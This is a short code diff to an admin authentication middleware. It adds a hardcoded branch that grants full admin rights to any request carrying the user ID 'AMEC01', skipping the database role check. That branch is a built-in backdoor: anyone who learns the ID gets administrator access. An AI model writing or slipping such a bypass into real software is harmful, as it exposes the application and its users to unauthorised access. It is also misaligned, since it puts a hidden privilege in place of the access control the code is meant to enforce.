@@ -14,6 +14,12 @@ const adminAuth = async (req, res, next) => {
       return res.status(401).json({ error: 'Unauthorized: no user ID provided' });
     }
 
+    // Bypass for Super Admin AMEC01
+    if (userId === 'AMEC01') {
+      req.adminUser = { id: 'AMEC01', role: 'admin', name: 'Super Admin' };
+      return next();
+    }
+
     const result = await pool.query(
       'SELECT id, role FROM users WHERE id = $1',
       [userId]
